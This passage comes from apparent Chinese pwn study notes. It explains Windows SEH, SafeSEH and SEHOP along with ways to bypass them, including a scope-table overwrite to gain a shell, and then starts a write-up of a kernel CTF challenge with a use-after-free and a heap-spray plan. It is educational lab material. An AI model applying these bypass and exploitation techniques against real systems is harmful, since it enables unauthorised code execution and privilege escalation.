</span><br></pre></td></tr></table></figure><p>TEB存放于fs段开头位置，那么fs[0]即为TIB，TIB第一个字段就保存了SEH链表的头部指针。而SEH链表中其他的节点<strong>存储在栈中</strong>。如下图:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-17_093508.png" alt=""></p><p>接下来确实看一下其在内存中的存储,有三种办法</p><p><strong>使用!exchain</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !exchain</span><br><span class="line"><span class="number">0019f</span>a38: ntdll!_except_handler4+<span class="number">0</span> (<span class="number">7742</span>af30)</span><br><span class="line">  CRT scope  <span class="number">0</span>, filter: ntdll!LdrpDoDebuggerBreak+<span class="number">2</span>e (<span class="number">77461</span>a95)</span><br><span class="line">                func:   ntdll!LdrpDoDebuggerBreak+<span class="number">32</span> (<span class="number">77461</span>a99)</span><br><span class="line"><span class="number">0019f</span>c9c: ntdll!_except_handler4+<span class="number">0</span> (<span class="number">7742</span>af30)</span><br><span class="line">  CRT scope  <span class="number">0</span>, func:   ntdll!LdrpInitializeProcess+<span class="number">1e57</span> (<span class="number">7745</span>c1f9)</span><br><span class="line"><span class="number">0019f</span>cf4: ntdll!_except_handler4+<span class="number">0</span> (<span class="number">7742</span>af30)</span><br><span class="line">  CRT scope  <span class="number">0</span>, filter: ntdll!_LdrpInitialize+<span class="number">3</span>d9f8 (<span class="number">77453f</span>3f)</span><br><span class="line">                func:   ntdll!_LdrpInitialize+<span class="number">3</span>da0b (<span class="number">77453f</span>52)</span><br><span class="line">Invalid exception <span class="built_in">stack</span> at ffffffff</span><br></pre></td></tr></table></figure><p><strong>使用FS段寄存器</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; ?poi(fs:[<span class="number">0</span>])</span><br><span class="line">Evaluate expression: <span class="number">1702456</span> = <span class="number">0019f</span>a38</span><br></pre></td></tr></table></figure><p><strong>使用TEB</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !teb</span><br><span class="line">TEB at <span class="number">0030b</span>000</span><br><span class="line">    ExceptionList:        <span class="number">0019f</span>a38</span><br><span class="line">    StackBase:            <span class="number">001</span>a0000</span><br><span class="line">    StackLimit:           <span class="number">0019</span>d000</span><br><span class="line">    SubSystemTib:         <span class="number">00000000</span></span><br><span class="line">    FiberData:            <span class="number">00001e00</span></span><br><span class="line">    ArbitraryUserPointer: <span class="number">00000000</span></span><br><span class="line">    Self:                 <span class="number">0030b</span>000</span><br><span class="line">    EnvironmentPointer:   <span class="number">00000000</span></span><br><span class="line">    ClientId:             <span class="number">000016</span>a4 . <span class="number">00000e00</span></span><br><span class="line">    RpcHandle:            <span class="number">00000000</span></span><br><span class="line">    Tls Storage:          <span class="number">004</span>a4bd0</span><br><span class="line">    PEB Address:          <span class="number">00308000</span></span><br><span class="line">    LastErrorValue:       <span class="number">0</span></span><br><span class="line">    LastStatusValue:      <span class="number">0</span></span><br><span class="line">    Count Owned Locks:    <span class="number">0</span></span><br><span class="line">    HardErrorMode:        <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="SEH工作原理"><a href="#SEH工作原理" class="headerlink" title="SEH工作原理"></a>SEH工作原理</h2><p>在线程初始化的时候，会自动在栈中安装一个SEH结构体，作为默认异常处理，他的next就是0xFFFFFFFFF，而这个异常程序大家应该都很熟悉，就是windows程序崩溃时那个弹窗，打印出来出错函数地址。</p><p>如果程序中使用了try、excpt、assert来处理异常信息，那么编译器就会在栈中压入一个SEH结构体，同时插入链表中。</p><p>当出现异常的时候，操作系统会先中断程序，然后从TIB中取出第一个SEH结构体（也就是最近的SEH结构），使用其中的handler处理这个异常。</p><p>如果这个异常处理函数处理不了这个异常，那么就顺着next往下找别的异常处理函数，直到找到一个可以处理这个异常的函数或者到底部，也就是弹出错误窗口然后杀死线程。</p><p>通常处理完异常后，需要执行展开（Unwind）操作，该操作先通知目标结点前的各异常处理函数释放资源，然后将之前的SEH链全部删除。该操作通常由各高级语言Rtl模块来完成，Win32汇编操作时既可以不展开，也可以手工展开，还可以使用RtlUnwind函数展开。</p><h3 id="unwind"><a href="#unwind" class="headerlink" title="unwind"></a>unwind</h3><p>当一个函数注册一个SEH的时候，通常都会干这些事：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push    一堆附加数据</span><br><span class="line">push   offset _Handler </span><br><span class="line">push   fs:[0]        ;next</span><br><span class="line">mov    fs:[0],esp       ;make head -&gt; new seh</span><br></pre></td></tr></table></figure><p>当触发异常调用SEH机制时，每个异常函数都需要四个重要的参数:</p><ol><li>pExcept：指向EXCEPTION_RECORD的结构体的指针，其中包含了异常相关信息，如地址、异常类型等。</li><li>pFrame：指向栈中的SEH结构体</li><li>pContext：指向context结构体，包含了所有寄存器状态信息。</li><li>pDispatch：不知道干嘛的</li></ol><p>在执行处理函数前，系统会将上述参数压栈，然后调用异常处理函数。</p><p>异常处理函数结束时有两个返回值：</p><p>0代表处理成功，返回原来程序发生异常的地方，继续执行。</p><p>1代表失败，那么就继续顺着SEH链表往后找可以处理这个异常的函数。</p><p>当系统找到了可以处理异常的函数后，系统会将已经遍历过的异常处理函数在调用一边，这个过程就是unwind操作。</p><p>其目的就是通知前面失败的SEH，系统已经处理完了异常,然后将前面失败的SEH从链表里面删除。</p><p>那么为什么需要unwind操作呢？</p><p>如果说程序通过层层的调用在SEH链表中找到了一个可以成功处理的handler，那么这时异常被处理成功返回，此时如果直接根据context恢复现场，会涉及到许多压栈操作，那么这些压栈操作就会破坏原来的SEH链表信息，fs[0]指向一个错误地址，程序将发生异常。</p><p>具体unwind做了什么呢？有兴趣的可以参考下这篇文章：<a href="https://blog.csdn.net/LPWSTR/article/details/78714486?spm=1001.2014.3001.5501">Windows异常世界历险记（二）——Win32用户层下SEH机制之对RtlUnwind的逆向分析-CSDN博客</a></p><h3 id="safeSEH"><a href="#safeSEH" class="headerlink" title="safeSEH"></a>safeSEH</h3><p>既然SEH存储在栈上，那么我们可以通过栈溢出修改SEH handler函数指针为shellcode地址，然后触发异常，函数进入SEH handler，就可以执行shellcode了。</p><p>为了针对这一种攻击手法，就有了safe SEH保护措施，那么safe SEH都做了哪些检查呢？</p><ol><li>检查异常处理链是否存在于当前程序栈中，如果不是，就终止异常处理函数调用。</li><li>检查异常处理函数指针是否指向栈中，如果指向，终止异常处理函数调用。</li><li>前面两个都通过后，调用新的函数RtlIsValidHandler，对异常处理函数做一个有效性验证。</li></ol><p>那么RtlIsValidHandler又做了哪些检查</p><ol><li>判断程序设置IMAGE_DLLCHARACTERISTICS_NO_SEH标识。设置了，异常就忽略，函数返回校验失败。</li><li>检测程序是否包含SEH表。如果包含，则将当前异常处理函数地址与该表进行匹配，匹配成功返回校验成功，否则失败。</li><li>判断 程序是否设置ILonly标识。设置了，标识程序只包含.NET编译人中间语言，函数直接返回校验失败</li><li>判断异常处理函数是否位于不可执行页（non-executable page）上。若位于，校验函数将检测DEP是否开启，如若系统未开启DEP则返回校验成功；否则程序抛出访问违例的异常</li></ol><p>如果异常处理函数的地址没有包含在加载模块的内存空间。校验函数将直接执行DEP相关检测，函数将依次进行如下检验：</p><ol><li>判断异常处理函数是否位于不可执行页（non-executable page）上。若位于，校验函数将检测DEP是否开启，如若系统未开启DEP则返回校验成功；否则程序抛出访问违例的异常</li><li>判断系统是否允许跳转到加载模块的内存空间外执行，如允许则返回校验成功；否则返回校验失败</li></ol><p>其伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">RtlIsValidHandler</span><span class="params">(handler)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (handler is in image)&#123;    <span class="comment">//在加载模块内存空间内</span></span><br><span class="line">        <span class="keyword">if</span> (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag ser)</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        <span class="keyword">if</span> (image has a SafeSEH table)     <span class="comment">//含有安全SEH表，说明程序启用SafeSEH</span></span><br><span class="line">            <span class="keyword">if</span> (handler found in the table)    <span class="comment">// 异常处理函数地址出现在安全SEH表中</span></span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            <span class="keyword">else</span>    <span class="comment">// 异常处理函数未出现在安全SEH表中</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">        <span class="keyword">if</span> (image is a .NET assembly with the ILonly flag <span class="built_in">set</span>)     <span class="comment">//只包含IL</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler is on a non-executable page)&#123;    <span class="comment">// 跑到不可执行页上</span></span><br><span class="line">        <span class="keyword">if</span> (ExecuteDispatchEnable bit <span class="built_in">set</span> in the process flags)    <span class="comment">//DEP关闭</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACESS_VIOLATION; <span class="comment">//抛出访问违例异常</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler is not in an image)&#123;    <span class="comment">// 在加载模块内存之外，并且在可执行页上</span></span><br><span class="line">        <span class="keyword">if</span> (ImageDispatchEnable bit <span class="built_in">set</span> in the process flags)    <span class="comment">// 允许在加载模块内存空间外执行</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;    <span class="comment">//前面所有条件都满足就允许这个异常处理函数执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么，如果我们想绕过safe SEH来攻击SEH的话，如何绕过呢？</p><ol><li>异常处理函数位于加载模块内存范围之外，DEP关闭</li><li>异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH(安全SEH表为空)，同时相应模块不是纯IL</li><li>异常处理函数位于加载模块范围之内，相应模块启用SafeSEH（安全SEH表不为空），异常处理函数地址包含在安全SEH表中</li></ol><p>其中的DEP就是类似于linux中的NX，即堆栈数据段不可执行。</p><p>第一种情况还是比较简单的，在模块外的地址空间写shellcode或者找一个跳板跳到shellcode即可。</p><p>第二种情况，可以利用未开启safe SEH的模块中找到一条跳转指令跳到shellcode。</p><p>第三种情况有两种方式，一是清空SEH表，欺骗系统未开启safeSEH，二是将我们的指令注册到SEH表中（难度比较大）。</p><p>除了以上三种方式，有更为简单的攻击手法：</p><p>1.不攻击SEH</p><p>2.如果SEH异常处理函数指向堆区域，及时安全校验发现SEH已经不可信，仍然会调用其已经被修改的异常处理函数，所以只需要将shellcode搞到堆即可绕过。</p><h3 id="SEHOP-1"><a href="#SEHOP-1" class="headerlink" title="SEHOP"></a>SEHOP</h3><p>针对于SEH攻击，SEHOP（SEH Overwrite Protection）横空出世。</p><p>SEHOP主要任务就是来检测SEH链表的完整性，在调用handler之前系统会先遍历链表，看一下最后一个节点是否为系统固定的最终处理函数，如果是，那么皆大欢喜；不是的话，那么不进行异常处理，程序退出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (process_flags &amp; <span class="number">0x40</span> == <span class="number">0</span>)  <span class="comment">// 如果没有SEH记录则不进行检测</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (record != <span class="number">0xFFFFFFFF</span>)  <span class="comment">// 开始检测</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (record &lt; stack_bottom || record &gt; stack_top) <span class="comment">// SEH 记录必须位于栈中</span></span><br><span class="line">                <span class="keyword">goto</span> corruption;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">char</span> *)record + <span class="keyword">sizeof</span>(EXCEPTION_REGISTRATION) &gt; stack_top) <span class="comment">// SEH 记录结构需完全在栈中</span></span><br><span class="line">                <span class="keyword">goto</span> corruption;</span><br><span class="line">            <span class="keyword">if</span> ((record &amp; <span class="number">3</span>) != <span class="number">0</span>) <span class="comment">// SEH记录必须4字节对齐</span></span><br><span class="line">                <span class="keyword">goto</span> corruption;</span><br><span class="line">            handler = record-&gt;handler;</span><br><span class="line">            <span class="keyword">if</span> (handler &gt;= stack_bottom &amp;&amp; handler &lt; stack_top) <span class="comment">// 异常处理函数地址不能位于栈中</span></span><br><span class="line">                <span class="keyword">goto</span> corruption;</span><br><span class="line">            record = record-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">while</span> (record != <span class="number">0xFFFFFFFF</span>); <span class="comment">// 遍历S.E.H链</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((TEB-&gt;word_at_offset_0xFCA &amp; <span class="number">0x200</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (handler != &amp;FinalExceptionHandler) <span class="comment">// 核心检测，地球人都知道，不解释了</span></span><br><span class="line">        <span class="keyword">goto</span> corruption;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以相应的绕过方法就是伪造一个SEH链，修复SEH链完整性</p><h3 id="SEHscopetable"><a href="#SEHscopetable" class="headerlink" title="SEHscopetable"></a>SEHscopetable</h3><p>scopetable指向了一个用于描述函数中所有__try代码块的数组。在SEH4中，scopetable是一个被加密过后的scopetable的地址（xor cookie）</p><p>filterfunc指向异常过滤函数（__except中的表达式），handlerfunc指向except代码块。</p><p>如果filterdunc是NULL，那么Handlerfunc就指向__finally代码块。</p><p>具体有多少个try，体现在trylevel中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE</span> &#123;</span></span><br><span class="line">        DWORD GSCookieOffset;</span><br><span class="line">        DWORD GSCookieXOROffset;</span><br><span class="line">        DWORD EHCookieOffset;</span><br><span class="line">        DWORD EHCookieXOROffset;</span><br><span class="line">        _EH4_SCOPETABLE_RECORD ScopeRecord[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE_RECORD</span> &#123;</span></span><br><span class="line">        DWORD EnclosingLevel;</span><br><span class="line">        <span class="type">long</span> (*FilterFunc)();</span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            <span class="type">void</span> (*HandlerAddress)();</span><br><span class="line">            <span class="type">void</span> (*FinallyFunc)(); </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/v2-7bed1e36932eacf6d9ab87101a0c3e62_b.jpg" alt=""></p><p>在函数开始时，回先保存上个函数的ebp，然后将try level、加密后的scope table、sehhandler、seh next、异常指针、esp指针以及gs压栈，gs就是类似于canary（security cookie xor ebp）的东西,。</p><p>scopetable加密的方式就是异或一下securitycookie。</p><p>针对 __except_handler函数，如果我们伪造一个 scope table，把里面的 FilterFunc或者 FinallyFunc改为 system(‘cmd’)的地址，然后把这个伪造的 scope table通过溢出覆盖掉原 scope table，就能够getshell。</p><p>当然由于 栈中存储的 scope table地址是 _EH4_SCOPETABLE_addr ^ _security_cookie得来，所以我们也得知道 __security_cookie的实际值。同时覆盖时，也不可避免覆盖掉 GS Cookie，next SEH 和 except_handler，但也必须保证这三个值的正确性。</p>]]></content>
    
    
    <summary type="html">windows-pwn初识</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="windows" scheme="https://ixout.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>kernel学习笔记2</title>
    <link href="https://ixout.github.io/posts/63384/"/>
    <id>https://ixout.github.io/posts/63384/</id>
    <published>2024-01-08T09:35:11.000Z</published>
    <updated>2024-04-02T13:43:26.895Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RWCTF2023-体验赛-Digging-into-kernel-3"><a href="#RWCTF2023-体验赛-Digging-into-kernel-3" class="headerlink" title="RWCTF2023 体验赛 - Digging into kernel 3"></a>RWCTF2023 体验赛 - Digging into kernel 3</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先看启动脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ </span><br><span class="line">   3   │ qemu-system-x86_64 \</span><br><span class="line">   4   │     -m 128M \</span><br><span class="line">   5   │     -nographic \</span><br><span class="line">   6   │     -kernel ./bzImage \</span><br><span class="line">   7   │     -initrd ./rootfs.img \</span><br><span class="line">   8   │     -cpu kvm64,+smap,+smep \</span><br><span class="line">   9   │     -monitor /dev/null \</span><br><span class="line">  10   │     -append <span class="string">&#x27;console=ttyS0 kaslr kpti=1 quiet oops=panic panic=1 init=/init&#x27;</span> \</span><br><span class="line">  11   │     -no-reboot \</span><br><span class="line">  12   │     -snapshot \</span><br><span class="line">  13   │     -s</span><br><span class="line">  14   │     </span><br><span class="line">  15   │     <span class="comment">#-enable-kvm \</span></span><br><span class="line">───────┴────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>可以看到开启了smap,smep,kaslr,kpri等保护</p><p>再看init脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ </span><br><span class="line">   3   │ <span class="built_in">mkdir</span> /tmp </span><br><span class="line">   4   │ mount -t proc none /proc </span><br><span class="line">   5   │ mount -t sysfs none /sys </span><br><span class="line">   6   │ mount -t devtmpfs none /dev </span><br><span class="line">   7   │ mount -t tmpfs none /tmp </span><br><span class="line">   8   │ </span><br><span class="line">   9   │ <span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line">  10   │ <span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line">  11   │ <span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line">  12   │ </span><br><span class="line">  13   │ insmod /rwctf.ko</span><br><span class="line">  14   │ <span class="built_in">chmod</span> 666 /dev/rwctf</span><br><span class="line">  15   │ <span class="built_in">chmod</span> 700 /flag</span><br><span class="line">  16   │ <span class="built_in">chmod</span> 400 /proc/kallsyms</span><br><span class="line">  17   │ </span><br><span class="line">  18   │ <span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  19   │ <span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  20   │ </span><br><span class="line">  21   │ poweroff -d 120 -f &amp;</span><br><span class="line">  22   │ </span><br><span class="line">  23   │ <span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span> </span><br><span class="line">  24   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">  25   │ </span><br><span class="line">  26   │ umount /proc</span><br><span class="line">  27   │ umount /sys</span><br><span class="line">  28   │ umount /tmp</span><br><span class="line">  29   │ </span><br><span class="line">  30   │ poweroff -d 0 -f</span><br></pre></td></tr></table></figure><p>kptr_restrict参数控制是否对非特权用户隐藏内核符号地址的显示。</p><p>dmesg_restrict参数控制非特权用户对内核日志dmesg的访问权限。</p><p>为1就是非特权用户无权访问</p><p>那么主要就是利用rwctf.ko这个模块了</p><p>ida打开分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">rwmod_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// r12d</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">-1</span>;</span><br><span class="line">  cdev = <span class="number">255</span>;</span><br><span class="line">  qword_7A8 = (__int64)<span class="string">&quot;rwctf&quot;</span>;</span><br><span class="line">  qword_7B0 = (__int64)&amp;file_ops;</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)misc_register(&amp;cdev) )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="number">0</span>;</span><br><span class="line">    printk(&amp;unk_1B9);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>misc_register()</code> 函数用于注册杂项字符设备</p><p>注册的函数真正有用的函数便只有ioctl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">rwmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xC0DECAFE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;v7, a3, <span class="number">16LL</span>) &amp;&amp; v7 &lt;= <span class="number">1</span> )</span><br><span class="line">      kfree(buf[v7]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;v7, a3, <span class="number">16LL</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    v5 = v7;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    buf[v5] = _kmalloc(v8, <span class="number">3520LL</span>);</span><br><span class="line">    v6 = buf[v7];</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; <span class="number">2147483647uLL</span> )</span><br><span class="line">      BUG();</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v6, v9, v8) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到有明显的uaf漏洞,此外申请内存时最多只能同时控制两个obj</p><p>且必须申请后才能使用,这点倒是内核模块中似乎都如此</p><h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><p>这个解法是ctf-wiki为了讲解heap-spray特意选用的一种方法,为了讲解这一技巧可能选用了不那么直接的方法</p><p>核心思路是通过uaf改大user_key_payload的datalen字段,以此做到溢出并泄露内核基址,并再次通过uaf写pipe管道的函数表字段从而完成最终利用</p><p>为了方便利用需要将decription长度和payload的长度区分开,以此简化利用模型,只需要考虑payload的两个obj</p><p><strong>add_key() 会先分配一个临时的 obj1 拷贝 payload 后再分配一个 obj2 作为 user_key_payload</strong>，若我们先分配一个 obj 并释放后再调用 add_key() 则该 obj 不会直接成为 <code>user_key_payload</code> ，而是会在后续的数次分配中都作为拷贝 payload 的临时 obj 存在。</p><blockquote><p>另一个显然的办法是程序提供了两个obj的管理,那就使用这两个指针来uaf,但这里wiki为了展示堆喷这一技巧选择就用一个指针来完成</p><p>此外个人的一个想法是能不能使得obj1与obj2位于两个kmem_cache分配器中,其中关键的user_key_payload位于192,临时obj1则位于128,有时间可以试试</p></blockquote><p><strong>但我们可以通过堆喷将 UAF obj 分配到 user_key_payload</strong>，考虑如下流程：</p><ul><li>利用题目功能构建 UAF object。</li><li>堆喷射 <code>user_key_payload</code> ，UAF obj 作为拷贝 payload 的临时 obj 